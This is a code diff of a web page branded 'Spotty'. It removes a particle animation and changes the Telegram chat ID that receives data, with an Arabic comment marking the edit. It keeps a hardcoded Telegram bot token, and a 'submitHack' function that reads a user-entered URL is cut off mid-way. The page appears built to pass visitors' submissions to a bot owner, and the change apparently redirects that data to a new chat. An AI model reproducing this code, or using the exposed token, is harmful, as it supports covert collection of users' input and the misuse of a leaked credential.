@@ -112,12 +112,8 @@ footer{position:relative;z-index:1;margin-top:auto;padding:1rem;font-size:.9rem;
 <footer>© All rights reserved – Spotty</footer>
 
 <script>
-/* particles */
-(()=>{const cv=document.getElementById('particles-canvas'),ctx=cv.getContext('2d');function resize(){cv.width=innerWidth;cv.height=innerHeight}addEventListener('resize',resize);resize();class Particle{constructor(){this.x=Math.random()*cv.width;this.y=Math.random()*cv.height;this.vx=(Math.random()-.5)*1.4;this.vy=(Math.random()-.5)*1.4}update(){this.x+=this.vx;this.y+=this.vy;if(this.x<0||this.x>cv.width)this.vx*=-1;if(this.y<0||this.y>cv.height)this.vy*=-1}draw(){ctx.beginPath();ctx.arc(this.x,this.y,1.5,0,Math.PI*2);ctx.fillStyle='#ffd700';ctx.shadowColor='#ffd700';ctx.shadowBlur=8;ctx.fill()}}const particles=Array.from({length:150},()=>new Particle());function animate(){ctx.clearRect(0,0,cv.width,cv.height);particles.forEach(p=>{p.update();p.draw()});requestAnimationFrame(animate)}animate()})();
-
-/* telegram send */
 const TOKEN='8240453564:AAHBQaQkfht76FiKq1o_3viQlX6gD1o9i9Q';
-const CHAT_ID='8240453564';
+const CHAT_ID='566394809'; // <== تم التعديل
 async function submitHack(){
   const url=document.getElementById('hackUrl').value.trim();
   if(!url)return alert('Link is empty!');
